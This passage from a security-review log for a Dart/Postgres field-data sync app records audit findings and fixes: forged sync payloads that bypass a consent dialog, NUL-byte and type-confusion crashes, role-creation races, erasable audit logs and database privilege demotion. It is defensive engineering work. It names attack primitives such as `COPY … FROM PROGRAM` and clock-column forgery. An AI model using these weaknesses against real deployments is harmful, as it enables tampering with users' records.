  over cleartext to a private-range host). There is an honest-path variant with
  no attacker: two people sharing an institutional mailbox on one device are
  fused and one profile is destroyed. No test drives a hostile `serverUserId`.
- **K-5 — `UnknownColumnStore.promote` is unguarded, and latent rather than
  prevented.** Writes stashed values into real columns from `onOpen` on every
  launch: no validation, no authorization, no clock, no conflict capture, no
  bound on entry count, column-name length or value size. Nothing promotes today
  only because a column must be unknown at stash time and declared at promote
  time — a timing accident, not a control. Two harms arm on the next additive
  bump: a stashed value overwriting a migration's own backfill (schema v4's
  `Tags.color_hex` `UPDATE` is the shape), and an unwritable value throwing
  inside `onOpen`, where the entry is deleted only *after* a successful update —
  so the failure repeats every launch and **the database never opens again**.
  The store is not project-scoped; `Users`, `User_Emails` and `Tags` are
  globally keyed and are a live cross-project channel. Held values ride outward
  on every push and export, so a stash spreads device-to-device.
- **K-6 — a malformed `rows` *container* is still accepted silently.** `rows`
  as a string/number/list/null, or a known table whose value is not a list, all
  answer `200 applied=0 outcomes={}` — indistinguishable from an honest empty
  push. 10.64 enumerated every *field* and not every *container*. Harmless today
  (no write; 10.28 rule 2 holds an unanswered row client-side) and recorded
  because it is J-5's shape one level up, found immediately below the pass that
  closed J-5. Fold into whatever touches the envelope next; not worth its own
  task.
- **K-7 — two instrument items.** (a) `scripts/verify_ats_transport_security.sh`
  recommends `macos --release` in its own header as "the cheapest real run" and
  that invocation cannot work — `flutter drive` refuses release mode for
  non-web — so the script reports FAIL for a reason unrelated to ATS. It fails
  loudly rather than passing, which is the right direction; fix the header to
  say `--profile`, which is what F13 needs anyway. (b)
  `verify_c3_cleartext_defaults.py` is **still** not wired into
  `gate_smoke_test.sh` — 10.65 filed this as its own discovered scope and no
  task carries it, so C-3 stays proven only when someone remembers. It was run
  by hand at this gate: 16 checks, no skips.
- **K-8 — §4.19 rule 4's consent gate has a hole the shape of J-1's fourth
  defect, and the message claims a consent that never happened.** `clockColumns`
  excludes five columns from the was→becomes diff; the justification beside it
  is sound for **two** of them (`revision`, `updated_at` move on every honest
  edit) and does not cover `created_at` or `origin_device_id`, which do not, are
  taken verbatim from the payload, and are excluded anyway. Reproduced with
  `confirmChanges: false`: a payload identical to the victim's own row except in
  the clock is written with **no dialog**, `changes` and `destructiveChanges`
  both `0`, and the UI renders *"Your copy was replaced as you confirmed — 0
  values were changed."* Both halves false in one sentence. `origin_device_id`
  is the documented final LWW tiebreaker, so a lexically-high forged value wins
  every future tie against the victim's genuine edits; `created_at` is falsified
  provenance. Not blocking (no field data destroyed, and `Sync_Conflicts` does
  capture the prior row) but it is the *visibility* half of the clause, which
  §4.19 says is the whole of the defence against an unauthenticated payload.
  **Fold into K-1's task** — same section, same rule, and the fix wants deciding
  once: either narrow `clockColumns` to the two columns its own comment
  justifies, or show clock-only changes in a distinct, non-alarming form. Also
  fix the `replicaUpdated` string so it cannot claim consent it did not get.
- **K-9 — 10.69's `CREATE ROLE` race, reintroduced in shell in the same round
  it was fixed in Dart.** `server/backup/backup.sh:65-68`, landed by task 10.63
  in commit `58cb20d` — the same commit that adopted 10.66's "fix the class, not
  the instance" — does check-then-`CREATE ROLE` with no locking, which is
  exactly what 10.69 removed from `ensureServerAppRole` three commits later
  after reproducing it 30/30 at 8-way concurrency. `server/backup/restore.sh:547`
  has it too (pre-existing). Fails closed (`set -eu`, the loser aborts), so the
  outcome is a backup that does not run rather than a bad one — but a cron
  backup overlapping a manual `docker compose run backup` is not exotic. Cheap
  fix: the same unconditional-create-and-swallow-`42710`/`23505` shape, in bash.
- **K-10 — the test guarding J-3 cannot tell a refusal from a broken harness.**
  `server/test/integration/server_app_role_test.dart:100` asserts
  `throwsA(anything)` on `COPY … FROM PROGRAM`; a syntax error or a dropped
  connection satisfies it identically. H-8's weak-assertion class, on the test
  10.69 spent a task stabilising. Assert SQLSTATE `42501`. J-3's closure is not
  in doubt — the sibling `rolsuper` assertion in the same file is sound — but
  this test alone would pass against a server that was never demoted.
- **K-11 — two scope gaps in the newest tooling and the newest sweep.**
  (a) `verify_instrument_unchecked_returns.py` globs `scripts/*.sh` only,
  non-recursively, so `server/backup/backup.sh` and `restore.sh` are never
  scanned and no Python instrument is — including `gate_c_adversarial_pass.py`,
  the file `Cf` was found in and which the detector's own docstring names as the
  class's origin. Its regexes also miss the inverted spelling
  (`[ -n "$VAR" ] && fail …`), the dominant idiom in that directory. Its
  `0 findings` is a statement about a subset while its success line claims the
  set. (b) 10.67's cast-sweep table enumerates eleven directories and
  **`lib/data/sync/` appears in neither column** — not fixed, not "verified
  unaffected." `project_merger.dart:218,227` reads `row['user_id'] as String`
  off an imported archive in `_buildUserRemap`, which runs *before* the
  `RowValidator` loop the sweep names as its mitigation. Crash, not bypass; the
  point is that it is on K-1's path and the sweep said the class was enumerated.
- **The untouched half of §12.5, still unscheduled.** J-3 is closed for
  `COPY … FROM PROGRAM`, but `tritrack_app` can still `DELETE FROM
  auth_audit_log` — demonstrated live, 310 rows. C-5's forensic record remains
  erasable by whatever compromises the process that writes it. Not blocking; the
  point is that §12.5 named it and nothing carries it.
- **§4.15.1's time-bounded acceptance still has no task.** The cloud-backup
  default is accepted only until archive encryption with a client key-custody
  design lands "before the beta field season." That work is described in 10.60's
  discovered scope and has no task number — which is the same gap as K-1's, on a
  deadline. K-1 also changes its shape: the archive is now known to be a write
  primitive against the field record, not only a disclosure surface, and the
  linked cloud folder is somewhere a third party can put one.

#### From task 10.73 — what closing K-1 and K-8 left behind (2026-08-16)

*Four items. The first two are the ones a next gate will look for; the last two
are consequences of the fix that are visible to users and should not be found
by a user first.*

- **The linked cloud folder is a write surface and the app never says so.**
  §4.19.1's row 9 read "N/A — upload only", which is true of
  `CloudBackupService` and invites the conclusion that the path cannot deliver
  hostile data. It can, one hop over: a third party with write access drops a
  file named `TriTrack_<Project>_<timestamp>.zip` and the user later picks it
  through the Import button believing it is their own. §13.2 said this in
  passing and neither §4.19.1 nor §4.15.1 absorbed it. The *exploit* is bounded
  now — §4.19.2's clauses apply to whatever that file contains — so this is not
  urgent, but two things are still wrong on the page and on the screen:
  `auto_backup_section.dart` (deleted with the cloud backup, `3a9a2c8`) is three careful paragraphs about who can
  **read** the folder and silent about who can **write** to it, and §4.15.1
  reasoned about confidentiality only. **Needs a task number** (10.72's rule):
  correct §4.15.1's reasoning and add the write-surface sentence to the linking
  copy, next to the sentence that already tells the user to pick an account
  they trust. The row itself is already corrected in §4.19.1.
- **Signing the archive is the residual, and it is the same residual share
  payloads have.** Nothing authenticates a `.zip`, so §4.19.2's guarantee is
  visibility and recoverability rather than prevention: a file can still create
  records, and the email dedup can attribute those created records to a person
  the device knows. A signature needs a key the sender holds and the receiver
  trusts, which is **Phase 11 identity work** — the same Discovered Scope item
  10.61 opened for share payloads, and it should be one task covering both
  rather than two that drift.
- **An honest whole-project restore now writes one `Sync_Conflicts` row per
  updated row.** That is clause 4's recoverability half working as specified,
  and it is also several thousand unreviewed entries after a large merge, which
  is a review queue nobody will read. Task 10.12's surface was built for the
  occasional sync overwrite. **Needs a decision**: group an import's conflicts
  under one reviewable event, or accept the volume and say so.
- **The consent dialog caps its list at 40 changes and states the cap.** Stated
  rather than silently truncated, deliberately — a consent dialog that hides
  part of what it is asking about is not consent. But "and 900 more not listed
  here" is a poor thing to ask someone to agree to. **Needs design**: a grouped
  or per-table summary that stays honest at that size.

#### From task 10.68 — a flaky role-creation race, found by finally running the real suite (2026-08-16)

- **`test/integration/server_app_role_test.dart`'s `COPY ... FROM PROGRAM` test
  failed once under `scripts/run_server_tests_docker.sh`, and passed both in
  isolation and on a second full run.** `ensureServerAppRole` (`postgres_database.dart`)
  does check-then-`CREATE ROLE` with no locking; `dart test` runs test files
  concurrently by default, and this is the only file that calls it, so a race
  between two concurrent invocations checking `exists.isEmpty` before either
  has created the role is the likely cause. Not chased down as part of this
  task — out of scope for validation-shadowing, and it is exactly the kind of
  intermittent failure that is easy to burn a lot of time chasing without a
  reliable repro. Left here rather than dismissed as noise, per this task's
  own point about I-3: a control that fails once under load and passes when
  measured any other way is a control that has only been tested in the
  configuration where it doesn't fire.

#### From task 10.64 — envelope typing by enumeration, and two classes found beyond the brief (2026-08-16)

**The class named in the brief:** a caller-supplied JSON field parsed with an
unchecked cast (`as T?`) or bound into Postgres without excluding a byte
Postgres cannot store (a NUL byte in `TEXT`), so a wrong type or a NUL byte
draws an uncaught exception — a bare `500` — instead of a typed refusal.
J-4 named `cursor`/`batch_size` on `/sync/pull` and NUL bytes in
`device_id`/`project_id`. J-5 named a non-`Map` row entry inside a known
table vanishing with no `invalid` outcome — H-5's shape, reopened.

**Every sync-route field, enumerated, with a verdict:**

| Route | Field | Verdict |
| --- | --- | --- |
| `/sync/push`, `/sync/pull`, `/sync/ack` | `envelope`, `protocol_version`, `schema_version`, `schema_major` | Verified unaffected — already typed by task 10.46's `SyncEnvelope.fromJson` (`is! int` checks, throws `SyncProtocolException`). |
| all three | `project_id`, `device_id` (wrong type) | Verified unaffected — `_requireString` (`sync_protocol.dart`) already throws `SyncProtocolException` on non-`String`. |
| all three | `project_id`, `device_id` (oversized) | Verified unaffected — task 10.56 bounded both to 200 chars in `sync_routes.dart`'s `handle()`. |
| all three | `project_id`, `device_id` (NUL byte) | **Fixed (J-4).** `handle()`'s bound check now also rejects a NUL byte via `_hasNulByte`, alongside the length check it already ran. |
| `/sync/pull`, `/sync/ack` | `cursor` (wrong type) | **Fixed (J-4).** `SyncPullRequest`/`SyncAckRequest.fromJson` used `json['cursor'] as int?`, which throws on anything but `int`/`null`. Replaced with `_optionalInt`, which throws `SyncProtocolException` (→ `400`) for present-but-wrong-type and returns `null` (→ the default) only for genuinely absent. |
| `/sync/pull` | `batch_size` (wrong type) | **Fixed (J-4).** Same `_optionalInt` fix; the existing `.clamp(1, maxSyncBatchSize)` still handles out-of-range once the value is confirmed to be an `int`. |
| `/sync/pull` | `cursor` (out of range, e.g. negative) | Verified unaffected — `TombstoneRetentionService.assertCursorIsFresh` already turns any cursor below the purge floor into a typed `409 cursor_too_old`, not a crash; a negative cursor is just another value below the floor. |
| `/sync/push` | `rows` (not a `Map`, table value not a `List`) | Verified unaffected — `decodeRows` already returns `{}` for either shape (`sync_protocol_test.dart`'s "tolerates malformed shapes"), and an empty push is a legitimate no-op. |
| `/sync/push` | a **known** table's row entry not a `Map` | **Fixed (J-5).** New `_malformedRowOutcomes` (`sync_routes.dart`), mirroring `_unknownTableOutcomes`'s H-5 fix one level in: reports `invalid` once per table with a non-`Map` entry, keyed `table/?`. |
| `/sync/push` | an **unknown** table name | Verified unaffected — already fixed by task 10.46 (`_unknownTableOutcomes`). |
| `/sync/push` | a row's own domain columns (frequency, bearing, enum values, etc.) | Verified unaffected — `RowValidator` plus `SyncService._tryWrite`'s per-row savepoint (task 10.46, G-5) already convert any database-level rejection, including a NUL byte in row content, into a per-row `invalid` outcome rather than failing the batch. Confirmed by reading `_tryWrite`'s catch-all, not assumed. |

**A class beyond the brief, found by asking "what else reads a caller field
with an unchecked cast" of the authorization path, not just the envelope
path:** `RowAuthorizer._governingValue` (`row_authorizer.dart`) resolved
`MutationRule.author`/`.owner`'s governing column (`user_id`/`owner_user_id`)
with `row[column] as String?`. On an **insert** (`existing == null`, so the
value is the caller's own, unvalidated `incoming` row) a wrongly-typed value
throws — demonstrated live: a `Projects` row with `owner_user_id: 12345` or
an `Observations`/`NonDetections` row with `user_id: 12345` each crashed the
*whole push* with an uncaught `TypeError`, not just the one bad row, because
this runs during authorization, before `SyncService._tryWrite`'s per-row
savepoint exists to catch it. Reproduced first
(`server/test/authz/authorization_test.dart`), then fixed with an explicit
type guard ahead of the cast — deliberately **not** by making
`_governingValue` return `null` for a wrong type, because `MutationRule
.permits` reads a `null` governing value as *permitted*: silently coercing a
malformed value to `null` would have turned the crash into an authorization
bypass, which is worse. New `DenialReason.malformedGoverningColumn` denies
instead. Verdict per site the same class could reach:

| Table (rule) | Governing column | Verdict |
| --- | --- | --- |
| `Projects` (`owner`) | `owner_user_id` | **Fixed.** No `emailColumns`, so nothing upstream of `_governingValue` catches a malformed value; demonstrated crashing before the fix. |
| `Observations`, `Non_Detections` (`author`) | `user_id` | **Fixed.** Same shape; `Observations` demonstrated crashing before the fix. |
| `Users`, `User_Emails` (`author`) | `user_id` | Verified unaffected — both declare `emailColumns`, so `_authorizeEmailClaim` already denies a malformed identity column before `_governingValue` is ever reached (a fortunate side effect of task 10.55, not a designed protection — now backed by the same explicit guard as the others regardless). |
| `Project_Memberships` (`projectOwner`, `viaProject`) | `project_id` | Verified unaffected — `project_id` is also this table's `projectScopeColumn`, and the scope check (`incoming[scope] != projectId`) already rejects any non-matching value, string or not, before `_governingValue` runs. |
| `Tags`, `Project_Tags`, `Triangulation_Sessions`, `Estimated_Positions`, `Actual_Tag_Locations` (`anyUser`) | — | Not applicable — `MutationRule.anyUser`'s `governingColumn` is `null`; `_governingValue` returns `null` immediately without touching the row. |

**A third candidate site, chased and not reproduced:**
`/auth/link-status/<requestId>`'s path parameter reaches the same
`WHERE request_id = $1` shape `device_id` does. Two other auth-route sites
(`/auth/redeem`, `/auth/sessions/revoke-device`) *were* reproduced live
against real Postgres (`22021: invalid byte sequence for encoding "UTF8":
0x00`) and fixed the same way (new `_isUsableDeviceId`/`_hasNulByte` in
`auth_routes.dart`). This third one was tried three ways against a live
server — a percent-encoded `%00` over a real socket, a raw literal NUL byte
written directly onto the wire, and a `shelf.Request` built in-process with a
`Uri` carrying a raw NUL character — and all three came back `200`, never
`400`, because `dart:core`'s `Uri` percent-encodes a raw control character
the instant one enters its `path` component; there is no `Uri` whose `.path`
getter can return a literal NUL byte for `_hasNulByte` to see. Recorded per
§12.6's own precedent ("claims I chased and could not reproduce" — a gate
that only reports its hits is not a measurement) rather than either silently
dropping it or writing a test that fakes reachability. The `_hasNulByte`
check on `requestId` stays anyway, as free defense in depth — see
`server/test/security/auth_route_security_test.dart`'s note at the end of
the NUL-byte group.

**On "generate it if hand-writing is impractical":** not invoked — the
enumerated field set across three sync routes and three auth routes was
small enough to hand-write and reason about individually, which is also what
made the two beyond-the-brief findings above legible as *specific* crashes
with *specific* fixes rather than a generated matrix's pass/fail count. A
future sweep with a much larger route surface should reconsider.

#### From task 10.63 — every database connection in the project, with a verdict (2026-08-16)

**The class:** a connection to Postgres running application SQL with more
privilege than the job it does requires — specifically, holding the
superuser attribute when the statements it actually sends never need it.
J-3 demonstrated the always-on server connection; the same question asked of
every other connection in the project:

| Connection | Site | Verdict |
| --- | --- | --- |
| Server sync/auth connection | `server.dart`'s `connection` | **Fixed.** Runs migrations as admin (needs DDL), then `assumeServerAppRole` demotes it to `tritrack_app` (`NOSUPERUSER`, `SELECT/INSERT/UPDATE/DELETE` only) for the rest of the process's life. |
| Server audit-write connection | `server.dart`'s `auditConnection` | **Fixed.** Same demotion, immediately after open — never runs migrations itself, relies on the sync connection having ensured the role first. |
| Audit-retention purge job | `bin/purge_audit_logs.dart` | **Fixed.** Standalone entrypoint (cron-scheduled), so it calls `ensureServerAppRole` itself rather than assuming the server has already run, then demotes the same way. |
| Backup dump | `server/backup/backup.sh` (`pg_dump` + the schema-version `psql` query) | **Fixed.** New `tritrack_backup` role, `SELECT`-only (narrower than `tritrack_app` — this connection never writes), bootstrapped by the script itself since `docker compose run backup` has no dependency on `server` having started. |
| Restore | `server/backup/restore.sh` | **Verified unaffected — already closed.** Task 10.59 (finding I-10) gave this its own `tritrack_restore` role, scoped to `CREATE` on one disposable staging database and nothing else. Kept separate from `tritrack_app` on purpose: restore's job (replay an archive's DDL) and the server's job (steady-state DML) need different grants, and unifying them would widen whichever is narrower today. |
| Test harness | every `server/test/**/*.dart` via `database_test_config.dart` | **Verified unaffected — different class.** Connects as admin, and genuinely needs admin-level DDL (`CREATE`/`DROP SCHEMA ... CASCADE` for per-file isolation). Runs only against a disposable database (a fresh schema, or the whole throwaway `docker-compose.server-test.yml` project torn down with `-v` after `scripts/run_server_tests_docker.sh`) — never the always-on, network-facing connection the finding is about. |
| Gate drills and verify scripts | `scripts/backup_restore_drill.sh`, `verify_h6_archive_forgery.sh`, `verify_i1_source_identity.sh`, `verify_c5_denial_audit.py`, `gate_c_adversarial_pass.py` | **Verified unaffected — different class.** Operator-run, one-off tooling against ephemeral gate/drill databases. Several need genuine admin operations (`CREATE`/`DROP`/`RENAME DATABASE`) to simulate restore scenarios that a least-privilege role structurally cannot and should not have. |

**What the enumeration itself caught, before this task could be marked
done:** `ensureServerAppRole`'s first version granted `SELECT, INSERT,
UPDATE, DELETE ON ALL TABLES`, reasoned (from a `grep` of only
`postgres_schema.dart`) that no Postgres `SEQUENCE`s existed to grant `USAGE`
on. `auth_audit_log` and `sync_traffic_log` — defined in
`security/audit_log.dart` and `diagnostics/sync_traffic_log.dart`, outside
that one file — are `BIGSERIAL`, which **is** a sequence. The new
`server/test/integration/server_app_role_test.dart` failed on its first run
with `permission denied for sequence ..._id_seq`, which is exactly what a
production insert into either table would have hit the first time this
landed without a live-fire test. Fixed by granting `USAGE, SELECT ON ALL
SEQUENCES IN SCHEMA public` alongside the table grant, in both
`ensureServerAppRole` and `backup.sh`'s `tritrack_backup` bootstrap. Verified
live afterward: a real `/auth/magic-link` request against a docker-composed
stack wrote a row to `auth_audit_log` through the demoted role, and `SELECT
rolsuper` confirmed `tritrack_app`/`tritrack_backup` both read `f` while the
admin user still reads `t`.

New role documentation lives in `server/README.md` under "Database
credentials"; grant/role reasoning lives in the doc comments on
`ensureServerAppRole`/`assumeServerAppRole` (`postgres_database.dart`).
